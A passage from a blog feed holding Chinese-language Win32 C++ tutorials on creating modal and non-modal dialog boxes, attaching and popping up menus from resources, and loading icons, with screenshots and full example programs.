    <content type="html"><![CDATA[<p><img src="/2021/08/27/windows%E5%AF%B9%E8%AF%9D%E6%A1%86%E8%B5%84%E6%BA%90/1.png" alt="1"></p><blockquote><p>对话框的创建</p></blockquote><p><img src="/2021/08/27/windows%E5%AF%B9%E8%AF%9D%E6%A1%86%E8%B5%84%E6%BA%90/2.png" alt="2"></p><blockquote><p>模态对话框和非模态对话框的区别就是  非模态对话框  如果被打开了   你还可以继续操作这个对话框后面的其他对话框</p></blockquote><p><img src="/2021/08/27/windows%E5%AF%B9%E8%AF%9D%E6%A1%86%E8%B5%84%E6%BA%90/3.png" alt="3"></p><blockquote><p>就比如这个属性对话框就是一个非模态对话框  打开它的同时  一样可以操作后面的main.app这些</p></blockquote><blockquote><p>创建非模态对话框</p></blockquote><p><img src="/2021/08/27/windows%E5%AF%B9%E8%AF%9D%E6%A1%86%E8%B5%84%E6%BA%90/4.png" alt="4"></p><p><img src="/2021/08/27/windows%E5%AF%B9%E8%AF%9D%E6%A1%86%E8%B5%84%E6%BA%90/5.png" alt="5"></p><blockquote><p>往对话框添加东西 也是很简单的  直接拖</p></blockquote><p><img src="/2021/08/27/windows%E5%AF%B9%E8%AF%9D%E6%A1%86%E8%B5%84%E6%BA%90/6.png" alt="6"></p><p><img src="/2021/08/27/windows%E5%AF%B9%E8%AF%9D%E6%A1%86%E8%B5%84%E6%BA%90/7.png" alt="7"></p><blockquote><p>直接点工具箱  想添加什么 拖过去就行了</p></blockquote><p><img src="/2021/08/27/windows%E5%AF%B9%E8%AF%9D%E6%A1%86%E8%B5%84%E6%BA%90/8.png" alt="8"></p><blockquote><p>然后保存  然后在来运行刚才的程序</p></blockquote><p><img src="/2021/08/27/windows%E5%AF%B9%E8%AF%9D%E6%A1%86%E8%B5%84%E6%BA%90/9.png" alt="9"></p><blockquote><p>添加的东西也都在上面</p></blockquote><blockquote><p>创建模态对话框</p></blockquote><p><img src="/2021/08/27/windows%E5%AF%B9%E8%AF%9D%E6%A1%86%E8%B5%84%E6%BA%90/10.png" alt="10"></p><blockquote><p>要用EndDialog 函数来终止</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;CommCtrl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&quot;resource.h&quot;</span></span><br><span class="hljs-function">INT_PTR CALLBACK <span class="hljs-title">Dlgproc</span><span class="hljs-params">(   <span class="hljs-comment">//回调函数</span></span></span><br><span class="hljs-params"><span class="hljs-function">HWND hWnd,</span></span><br><span class="hljs-params"><span class="hljs-function">UINT Umsg,</span></span><br><span class="hljs-params"><span class="hljs-function">WPARAM wparam,</span></span><br><span class="hljs-params"><span class="hljs-function">LPARAM lparam</span></span><br><span class="hljs-params"><span class="hljs-function">)</span> </span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-built_in"><span class="hljs-keyword">switch</span></span> (Umsg)<br>&#123;<br><span class="hljs-keyword">case</span> WM_INITDIALOG:<br>&#123;<br><span class="hljs-built_in">MessageBoxW</span>(hWnd, <span class="hljs-string">L&quot;窗口创建了&quot;</span>, <span class="hljs-string">L&quot;标题&quot;</span>, MB_OK);<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-keyword">case</span> WM_CLOSE:<br>&#123;<br><span class="hljs-comment">/*DestroyWindow(hWnd);</span><br><span class="hljs-comment">PostQuitMessage(0);*/</span><br><span class="hljs-built_in">EndDialog</span>(hWnd, <span class="hljs-number">0</span>);<br>&#125;<br><span class="hljs-keyword">default</span>:<br>&#123;<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br><br>&#125;<br><span class="hljs-keyword">return</span> TRUE;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> WINAPI <span class="hljs-title">WinMain</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">HINSTANCE hInstance,</span></span><br><span class="hljs-params"><span class="hljs-function">HINSTANCE hPrevInstance,</span></span><br><span class="hljs-params"><span class="hljs-function">LPSTR     lpCmdLine,</span></span><br><span class="hljs-params"><span class="hljs-function"><span class="hljs-keyword">int</span>       nShowCmd</span></span><br><span class="hljs-params"><span class="hljs-function">)</span> </span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-built_in">DialogBoxW</span>(hInstance, <span class="hljs-built_in">MAKEINTRESOURCEW</span>(IDD_DIALOG1), <span class="hljs-literal">NULL</span>, Dlgproc); <span class="hljs-comment">//创建模态对话框</span><br><span class="hljs-comment">//HWND hwnd=CreateDialogW(hInstance, MAKEINTRESOURCEW(IDD_DIALOG1),NULL,Dlgproc);//创建非模态对话框</span><br><span class="hljs-comment">//ShowWindow(hwnd, SW_SHOWNORMAL);//显示对话框</span><br><span class="hljs-comment">//MSG msg&#123; 0 &#125;;</span><br><span class="hljs-comment">//while (GetMessage(&amp;msg,0,0,0))   //发送消息</span><br><span class="hljs-comment">//&#123;</span><br><span class="hljs-comment">//TranslateMessage(&amp;msg);</span><br><span class="hljs-comment">//DispatchMessageW(&amp;msg);</span><br><span class="hljs-comment">//&#125;</span><br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Windows</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Windows</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>windwos编程资源操作2</title>
    <link href="/2021/08/26/windwos%E7%BC%96%E7%A8%8B%E8%B5%84%E6%BA%90%E6%93%8D%E4%BD%9C2/"/>
    <url>/2021/08/26/windwos%E7%BC%96%E7%A8%8B%E8%B5%84%E6%BA%90%E6%93%8D%E4%BD%9C2/</url>
    
    <content type="html"><![CDATA[<p><img src="/2021/08/26/windwos%E7%BC%96%E7%A8%8B%E8%B5%84%E6%BA%90%E6%93%8D%E4%BD%9C2/1.png" alt="1"></p><blockquote><p>还是和前面的一样 先添加资源</p></blockquote><p><img src="/2021/08/26/windwos%E7%BC%96%E7%A8%8B%E8%B5%84%E6%BA%90%E6%93%8D%E4%BD%9C2/2.png" alt="2"></p><p><img src="/2021/08/26/windwos%E7%BC%96%E7%A8%8B%E8%B5%84%E6%BA%90%E6%93%8D%E4%BD%9C2/3.png" alt="3"></p><blockquote><p>这是顶级菜单   以及 子菜单</p></blockquote><p><img src="/2021/08/26/windwos%E7%BC%96%E7%A8%8B%E8%B5%84%E6%BA%90%E6%93%8D%E4%BD%9C2/4.png" alt="4"></p><blockquote><p>然后保存</p></blockquote><blockquote><p>还是先用前面的部分的代码</p></blockquote><blockquote><p>然后 开始添加菜单</p></blockquote><h2 id="第一种方式"><a href="#第一种方式" class="headerlink" title="第一种方式"></a>第一种方式</h2><blockquote><p>直接在创建窗口的时候创建菜单</p></blockquote><p><img src="/2021/08/26/windwos%E7%BC%96%E7%A8%8B%E8%B5%84%E6%BA%90%E6%93%8D%E4%BD%9C2/5.png" alt="5"></p><p><img src="/2021/08/26/windwos%E7%BC%96%E7%A8%8B%E8%B5%84%E6%BA%90%E6%93%8D%E4%BD%9C2/6.png" alt="6"></p><blockquote><p>直接运行</p></blockquote><p><img src="/2021/08/26/windwos%E7%BC%96%E7%A8%8B%E8%B5%84%E6%BA%90%E6%93%8D%E4%BD%9C2/7.png" alt="7"></p><blockquote><p>菜单直接出来了</p></blockquote><h2 id="第二种方式"><a href="#第二种方式" class="headerlink" title="第二种方式:"></a>第二种方式:</h2><blockquote><p>通过传到createwindwoW 函数中  因为这个函数接受一个菜单句柄参数</p></blockquote><p><img src="/2021/08/26/windwos%E7%BC%96%E7%A8%8B%E8%B5%84%E6%BA%90%E6%93%8D%E4%BD%9C2/8.png" alt="8"></p><p><img src="/2021/08/26/windwos%E7%BC%96%E7%A8%8B%E8%B5%84%E6%BA%90%E6%93%8D%E4%BD%9C2/9.png" alt="9"></p><blockquote><p>因为涉及到句柄  所以就和前面的资源操作一样  需要先导入菜单</p></blockquote><p><img src="/2021/08/26/windwos%E7%BC%96%E7%A8%8B%E8%B5%84%E6%BA%90%E6%93%8D%E4%BD%9C2/10.png" alt="10"></p><blockquote><p>LoadMenuW函数接受两个参数   第一个是 这个程序的句柄  第二个是菜单资源的名称</p></blockquote><p><img src="/2021/08/26/windwos%E7%BC%96%E7%A8%8B%E8%B5%84%E6%BA%90%E6%93%8D%E4%BD%9C2/11.png" alt="11"></p><blockquote><p>然后运行</p></blockquote><p><img src="/2021/08/26/windwos%E7%BC%96%E7%A8%8B%E8%B5%84%E6%BA%90%E6%93%8D%E4%BD%9C2/12.png" alt="12"></p><h2 id="第三种"><a href="#第三种" class="headerlink" title="第三种:"></a>第三种:</h2><blockquote><p>通过点击  添加菜单</p></blockquote><p><img src="/2021/08/26/windwos%E7%BC%96%E7%A8%8B%E8%B5%84%E6%BA%90%E6%93%8D%E4%BD%9C2/13.png" alt="13"></p><p><img src="/2021/08/26/windwos%E7%BC%96%E7%A8%8B%E8%B5%84%E6%BA%90%E6%93%8D%E4%BD%9C2/14.png" alt="14"></p><blockquote><p>右键展示子菜单</p></blockquote><blockquote><p>重新添加一个右键点击消息</p></blockquote><p><img src="/2021/08/26/windwos%E7%BC%96%E7%A8%8B%E8%B5%84%E6%BA%90%E6%93%8D%E4%BD%9C2/15.png" alt="15"></p><p><img src="/2021/08/26/windwos%E7%BC%96%E7%A8%8B%E8%B5%84%E6%BA%90%E6%93%8D%E4%BD%9C2/16.png" alt="16"></p><p><strong>ClientToScreen 函数  将 获取的鼠标坐标转化为 相对于屏幕的鼠标坐标   因为没有转换之前 是相对于工作区 也就是 直接创建的窗口的坐标位置</strong></p><blockquote><p>但是弹出菜单的函数接受坐标  出现的位置是相对于电脑屏幕而言的坐标 所以需要转换</p></blockquote><p><img src="/2021/08/26/windwos%E7%BC%96%E7%A8%8B%E8%B5%84%E6%BA%90%E6%93%8D%E4%BD%9C2/17.png" alt="17"></p><p><img src="/2021/08/26/windwos%E7%BC%96%E7%A8%8B%E8%B5%84%E6%BA%90%E6%93%8D%E4%BD%9C2/18.png" alt="18"></p><p><strong>GetCursorPos 函数直接获取屏幕中的鼠标坐标</strong></p><h2 id="给子菜单添加消息"><a href="#给子菜单添加消息" class="headerlink" title="给子菜单添加消息"></a>给子菜单添加消息</h2><blockquote><p>先找到子菜单的ID</p></blockquote><p><img src="/2021/08/26/windwos%E7%BC%96%E7%A8%8B%E8%B5%84%E6%BA%90%E6%93%8D%E4%BD%9C2/19.png" alt="19"></p><p><img src="/2021/08/26/windwos%E7%BC%96%E7%A8%8B%E8%B5%84%E6%BA%90%E6%93%8D%E4%BD%9C2/20.png" alt="20"></p><blockquote><p>点击子菜单</p></blockquote><p><img src="/2021/08/26/windwos%E7%BC%96%E7%A8%8B%E8%B5%84%E6%BA%90%E6%93%8D%E4%BD%9C2/21.png" alt="21"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;CommCtrl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&quot;resource.h&quot;</span></span><br><span class="hljs-function">LRESULT CALLBACK <span class="hljs-title">WindowProc</span><span class="hljs-params">(   <span class="hljs-comment">//消息处理函数</span></span></span><br><span class="hljs-params"><span class="hljs-function">_In_ HWND   hwnd,</span></span><br><span class="hljs-params"><span class="hljs-function">_In_ UINT   uMsg,</span></span><br><span class="hljs-params"><span class="hljs-function">_In_ WPARAM wParam,</span></span><br><span class="hljs-params"><span class="hljs-function">_In_ LPARAM lParam</span></span><br><span class="hljs-params"><span class="hljs-function">)</span> </span>&#123;<br><span class="hljs-keyword">static</span> HINSTANCE hInstance = <span class="hljs-built_in">GetModuleHandleW</span>(<span class="hljs-literal">NULL</span>);<br><span class="hljs-built_in"><span class="hljs-keyword">switch</span></span> (uMsg)<br>&#123;<br><span class="hljs-keyword">case</span> WM_CREATE:<br><span class="hljs-comment">//MessageBoxW(hwnd, L&quot;窗口创建了&quot;, L&quot;提示&quot;, MB_OK);</span><br><span class="hljs-comment">//添加控件</span><br><span class="hljs-built_in">CreateWindowW</span>(WC_BUTTON, <span class="hljs-string">L&quot;移动窗口&quot;</span>, WS_CHILD | WS_VISIBLE, <span class="hljs-number">10</span>, <span class="hljs-number">10</span>, <span class="hljs-number">120</span>, <span class="hljs-number">40</span>, hwnd, (HMENU)<span class="hljs-number">0x100</span>, hInstance, <span class="hljs-number">0</span>);<br><span class="hljs-built_in">CreateWindowW</span>(WC_BUTTON, <span class="hljs-string">L&quot;获取文本框内容&quot;</span>, WS_CHILD | WS_VISIBLE, <span class="hljs-number">10</span>, <span class="hljs-number">60</span>, <span class="hljs-number">120</span>, <span class="hljs-number">40</span>, hwnd, (HMENU)<span class="hljs-number">0x101</span>, hInstance, <span class="hljs-number">0</span>);<br><span class="hljs-built_in">CreateWindowW</span>(WC_BUTTON, <span class="hljs-string">L&quot;设置文本框内容&quot;</span>, WS_CHILD | WS_VISIBLE, <span class="hljs-number">10</span>, <span class="hljs-number">110</span>, <span class="hljs-number">120</span>, <span class="hljs-number">40</span>, hwnd, (HMENU)<span class="hljs-number">0x102</span>, hInstance, <span class="hljs-number">0</span>);<br><span class="hljs-built_in">CreateWindowW</span>(WC_BUTTON, <span class="hljs-string">L&quot;设置父窗口&quot;</span>, WS_CHILD | WS_VISIBLE, <span class="hljs-number">10</span>, <span class="hljs-number">160</span>, <span class="hljs-number">120</span>, <span class="hljs-number">40</span>, hwnd, (HMENU)<span class="hljs-number">0x103</span>, hInstance, <span class="hljs-number">0</span>);<br><span class="hljs-built_in">CreateWindowW</span>(WC_EDIT, <span class="hljs-string">L&quot;文本框内容&quot;</span>, WS_CHILD | WS_BORDER | WS_VISIBLE, <span class="hljs-number">10</span>, <span class="hljs-number">320</span>, <span class="hljs-number">320</span>, <span class="hljs-number">80</span>, hwnd, (HMENU)<span class="hljs-number">0x104</span>, hInstance, <span class="hljs-number">0</span>);<br><span class="hljs-built_in">CreateWindowW</span>(WC_BUTTON, <span class="hljs-string">L&quot;设置ICON&quot;</span>, WS_CHILD | WS_VISIBLE, <span class="hljs-number">10</span>, <span class="hljs-number">220</span>, <span class="hljs-number">120</span>, <span class="hljs-number">40</span>, hwnd, (HMENU)<span class="hljs-number">0x105</span>, hInstance, <span class="hljs-number">0</span>);<br><span class="hljs-built_in">CreateWindowW</span>(WC_BUTTON, <span class="hljs-string">L&quot;设置菜单&quot;</span>, WS_CHILD | WS_VISIBLE, <span class="hljs-number">10</span>, <span class="hljs-number">420</span>, <span class="hljs-number">120</span>, <span class="hljs-number">40</span>, hwnd, (HMENU)<span class="hljs-number">0x106</span>, hInstance, <span class="hljs-number">0</span>);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> WM_CLOSE:<br><span class="hljs-built_in">MessageBoxW</span>(hwnd, <span class="hljs-string">L&quot;窗口关闭了&quot;</span>, <span class="hljs-string">L&quot;提示&quot;</span>, MB_OK);<br><span class="hljs-built_in">DestroyWindow</span>(hwnd);<br><span class="hljs-built_in">PostQuitMessage</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> WM_RBUTTONDOWN:<br>&#123;<br><span class="hljs-comment">/*WORD x = LOWORD(lParam);</span><br><span class="hljs-comment">WORD y = HIWORD(lParam);*/</span><br>POINT point&#123; <span class="hljs-number">0</span> &#125;;<br><span class="hljs-comment">/*point.x = x;</span><br><span class="hljs-comment">point.y = y;*/</span><br><span class="hljs-built_in">GetCursorPos</span>(&amp;point);<br><span class="hljs-comment">//ClientToScreen(hwnd, &amp;point);</span><br>HMENU hmenu = <span class="hljs-built_in">LoadMenuW</span>(hInstance, <span class="hljs-built_in">MAKEINTRESOURCEW</span>(IDR_MENU1));<br>HMENU hSubMenu = <span class="hljs-built_in">GetSubMenu</span>(hmenu, <span class="hljs-number">0</span>);<br><span class="hljs-built_in">TrackPopupMenu</span>(hSubMenu,TPM_LEFTALIGN, point.x, point.y,<span class="hljs-number">0</span>,hwnd,<span class="hljs-literal">NULL</span>);<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-keyword">case</span> WM_COMMAND:<br>&#123;<br>WORD ControlId = <span class="hljs-built_in">LOWORD</span>(wParam);<br><span class="hljs-built_in"><span class="hljs-keyword">switch</span></span> (ControlId)<br>&#123;<br><span class="hljs-keyword">case</span> <span class="hljs-number">0x100</span>:<br>&#123;<br>RECT rect&#123; <span class="hljs-number">0</span> &#125;;<br><span class="hljs-built_in">GetClientRect</span>(hwnd, &amp;rect);<br><span class="hljs-keyword">int</span> x = <span class="hljs-built_in">rand</span>() % (rect.right - <span class="hljs-number">120</span>);<br><span class="hljs-keyword">int</span> y = <span class="hljs-built_in">rand</span>() % (rect.bottom - <span class="hljs-number">40</span>);<br><span class="hljs-built_in">MoveWindow</span>((HWND)lParam, x, y, <span class="hljs-number">120</span>, <span class="hljs-number">40</span>, TRUE);<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-keyword">case</span> <span class="hljs-number">0x101</span>:<br>&#123;<br>WCHAR buff[<span class="hljs-number">100</span>]&#123; <span class="hljs-number">0</span> &#125;;<br>HWND hedit = <span class="hljs-built_in">GetDlgItem</span>(hwnd, <span class="hljs-number">0x104</span>);<br><span class="hljs-built_in">GetWindowTextW</span>(hedit, buff, <span class="hljs-number">100</span>);<br><span class="hljs-built_in">MessageBoxW</span>(hwnd, buff, <span class="hljs-string">L&quot;提示&quot;</span>, MB_OK);<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-keyword">case</span> <span class="hljs-number">0x102</span>:<br>&#123;<br><span class="hljs-comment">/*HWND hedit = GetDlgItem(hwnd, 0x104);</span><br><span class="hljs-comment">SetWindowTextW(hedit,0x104,L&quot;SetWindowTextW&quot;);*/</span><br><span class="hljs-built_in">SetDlgItemTextW</span>(hwnd, <span class="hljs-number">0x104</span>, <span class="hljs-string">L&quot;SetDlgItemTextW&quot;</span>);<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-keyword">case</span> <span class="hljs-number">0x103</span>:<br>&#123;<br>HWND hnote = <span class="hljs-built_in">FindWindowW</span>(<span class="hljs-literal">NULL</span>, <span class="hljs-string">L&quot;无标题 - 记事本&quot;</span>);<br><span class="hljs-built_in">SetParent</span>((HWND)lParam, hnote);<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-keyword">case</span> <span class="hljs-number">0x106</span>:<br>&#123;<br>HMENU hmenu = <span class="hljs-built_in">LoadMenuW</span>(hInstance, <span class="hljs-built_in">MAKEINTRESOURCEW</span>(IDR_MENU1));<br><span class="hljs-built_in">SetMenu</span>(hwnd, hmenu);<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-keyword">case</span> ID_Menu:<br>&#123;<br><span class="hljs-built_in">MessageBoxW</span>(hwnd, <span class="hljs-string">L&quot;子菜单1&quot;</span>, <span class="hljs-string">L&quot;子菜单1被点击了&quot;</span>, MB_OK);<br><span class="hljs-keyword">break</span>;<br>&#125;<br>&#125;<br><span class="hljs-keyword">break</span>;<br><br>&#125;<br><span class="hljs-keyword">default</span>:<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">DefWindowProcW</span>(hwnd, uMsg, wParam, lParam);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> WINAPI <span class="hljs-title">WinMain</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">HINSTANCE hInstance,</span></span><br><span class="hljs-params"><span class="hljs-function">HINSTANCE hPreInstance,</span></span><br><span class="hljs-params"><span class="hljs-function">LPSTR lpCmdeLine,</span></span><br><span class="hljs-params"><span class="hljs-function"><span class="hljs-keyword">int</span> nCmdShow</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-comment">//1.创建一个窗口类</span><br>WNDCLASSW myClass = &#123; <span class="hljs-number">0</span> &#125;;<br>myClass.lpszClassName = <span class="hljs-string">L&quot;51hook&quot;</span>;<br>myClass.lpfnWndProc = WindowProc;<br>myClass.hbrBackground = <span class="hljs-built_in">CreateSolidBrush</span>(<span class="hljs-built_in">RGB</span>(<span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>));<br><span class="hljs-comment">//myClass.hIcon = LoadIcon(hInstance, MAKEINTRESOURCE(IDI_ICON1));//设置图标</span><br><span class="hljs-comment">//myClass.hCursor = LoadCursorW(hInstance, MAKEINTRESOURCEW(IDC_CURSOR1));</span><br><span class="hljs-comment">//myClass.lpszMenuName = MAKEINTRESOURCEW(IDR_MENU1);</span><br><br><span class="hljs-comment">//2.注册窗口类</span><br><span class="hljs-built_in">RegisterClassW</span>(&amp;myClass);<br><span class="hljs-comment">//3.创建窗口</span><br><br><span class="hljs-comment">//HMENU hmenu = LoadMenuW(hInstance, MAKEINTRESOURCEW(IDR_MENU1));</span><br>HWND hwindow = <span class="hljs-built_in">CreateWindowW</span>(<br>myClass.lpszClassName,<br><span class="hljs-string">L&quot;51hook&quot;</span>,<br>WS_OVERLAPPEDWINDOW,<br>CW_USEDEFAULT,<br><span class="hljs-number">0</span>,<br>CW_USEDEFAULT,<br><span class="hljs-number">0</span>,<br><span class="hljs-literal">NULL</span>,<br><span class="hljs-literal">NULL</span>,<br>hInstance,<br><span class="hljs-number">0</span><br>);<br><span class="hljs-comment">//4.显示窗口</span><br><span class="hljs-built_in">ShowWindow</span>(hwindow, SW_SHOWNORMAL);<br><br><span class="hljs-comment">//5.获取消息</span><br>MSG msg = &#123; <span class="hljs-number">0</span> &#125;;<br><span class="hljs-keyword">while</span> (<span class="hljs-built_in">GetMessageW</span>(&amp;msg, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>)) &#123;<br><span class="hljs-built_in">DispatchMessageW</span>(&amp;msg);<span class="hljs-comment">//分发消息给消息处理函数</span><br>&#125;<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Windows</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Windows</tag>
      
      <tag>C++</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>windwos资源操作1</title>
    <link href="/2021/08/24/windwos%E7%BC%96%E7%A8%8B%E8%B5%84%E6%BA%90%E6%93%8D%E4%BD%9C1/"/>
    <url>/2021/08/24/windwos%E7%BC%96%E7%A8%8B%E8%B5%84%E6%BA%90%E6%93%8D%E4%BD%9C1/</url>
    
    <content type="html"><![CDATA[<p><img src="/2021/08/24/windwos%E7%BC%96%E7%A8%8B%E8%B5%84%E6%BA%90%E6%93%8D%E4%BD%9C1/1.png" alt="1"></p><h2 id="设置图标"><a href="#设置图标" class="headerlink" title="设置图标"></a>设置图标</h2><p>首先添加一个图标资源</p><p><img src="/2021/08/24/windwos%E7%BC%96%E7%A8%8B%E8%B5%84%E6%BA%90%E6%93%8D%E4%BD%9C1/2.png" alt="2"></p><p><img src="/2021/08/24/windwos%E7%BC%96%E7%A8%8B%E8%B5%84%E6%BA%90%E6%93%8D%E4%BD%9C1/3.png" alt="3"></p><blockquote><p>可以导入 也可以新建  这里就新建好了</p></blockquote><blockquote><p>随便画画 点击保存</p></blockquote><p><img src="/2021/08/24/windwos%E7%BC%96%E7%A8%8B%E8%B5%84%E6%BA%90%E6%93%8D%E4%BD%9C1/4.png" alt="4"></p><blockquote><p>保存之后资源文件夹里面会多出两个文件</p></blockquote><p><img src="/2021/08/24/windwos%E7%BC%96%E7%A8%8B%E8%B5%84%E6%BA%90%E6%93%8D%E4%BD%9C1/5.png" alt="5"></p><blockquote><p>先暂时不用管 继续操作</p></blockquote><blockquote><p>先要用到LoadIcon()函数  可以按F1进行查看详细信息</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">HICON <span class="hljs-title">LoadIconA</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">  HINSTANCE hInstance,</span></span><br><span class="hljs-params"><span class="hljs-function">  LPCSTR    lpIconName</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span>;<br></code></pre></td></tr></table></figure><blockquote><p><strong>参数</strong></p><p>hInstance</p><p>类型：<strong>HINSTANCE</strong></p><p>模块实例的句柄，其可执行文件包含要加载的图标。加载标准图标时，此参数必须为<strong>NULL</strong>。</p><p>lpIconName</p><p>类型：<strong>LPCTSTR</strong></p><p>要加载的图标资源的名称。或者，该参数可以在低位字中包含资源标识符，在高位字中包含零。使用<a 